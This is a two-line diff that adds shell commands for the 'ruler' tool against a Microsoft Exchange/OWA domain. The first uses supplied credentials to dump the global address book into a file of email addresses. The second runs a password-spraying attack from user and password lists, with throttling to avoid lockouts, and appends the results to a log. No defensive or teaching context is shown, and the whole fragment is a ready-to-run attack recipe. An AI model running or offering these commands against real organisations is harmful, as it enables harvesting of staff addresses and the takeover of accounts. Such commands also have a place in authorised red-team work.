@@ -1,0 +1,2 @@
+ruler -k -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -e "j.doe@example.com" --verbose abk dump -o emails.txt
+ruler -k -d "$DOMAIN" brute --users owa-valid-users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a spray-results.txt
